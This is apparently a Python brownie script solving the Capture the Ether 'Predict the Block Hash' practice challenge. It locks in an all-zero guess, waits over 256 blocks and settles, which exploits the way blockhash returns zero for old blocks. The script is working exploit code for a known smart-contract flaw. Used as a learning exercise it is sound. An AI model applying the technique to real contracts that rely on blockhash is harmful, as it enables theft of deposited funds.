from scripts.helper.utils import *
from scripts.helper.account import _from, acc
from brownie import PredictTheBlockHashChallenge

##########################################
# Guessing an 8-bit number is apparently too easy. This time, you need to predict the entire 256-bit block hash for a future block.
#########################################

# solve the challenge
def solve_challenge(locally=False):
    # load challenge
    if not locally:
        predict_the_block_hash = load_challenge(ContractObject=PredictTheBlockHashChallenge, instance_key='predict_the_block_hash')
    else:
        predict_the_block_hash = deploy_locally(ContractObject=PredictTheBlockHashChallenge, from_account=_from | {'value':1e18})
    
    # call the attack function
    tx = predict_the_block_hash.lockInGuess(f'0x{"0"*64}', _from | {'value':1e18})

    # wait more than 256 blocks
    tx.wait(258)

    # call settle
    predict_the_block_hash.settle(_from)

    # check if the challenge is complete
    result = predict_the_block_hash.isComplete()
    print(result)

    # return the result
    return result

def main():
    solve_challenge()
